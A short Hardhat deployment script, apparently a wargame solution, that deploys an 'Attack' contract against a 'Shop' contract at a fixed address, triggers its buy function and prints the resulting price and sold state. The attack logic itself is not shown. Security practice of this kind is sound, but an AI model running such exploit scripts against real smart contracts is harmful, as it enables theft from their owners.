import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();
    const shop = await helper.getContractAt("Shop", "0x61ea3334F0c34a50A0A08Ea1080d06B5e82f2981");
    const attack = await helper.deployContract("Attack", shop.address);

    await helper.waitForTx(attack.buy());

    console.log(await shop.price())
    console.log(await shop.isSold());

}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });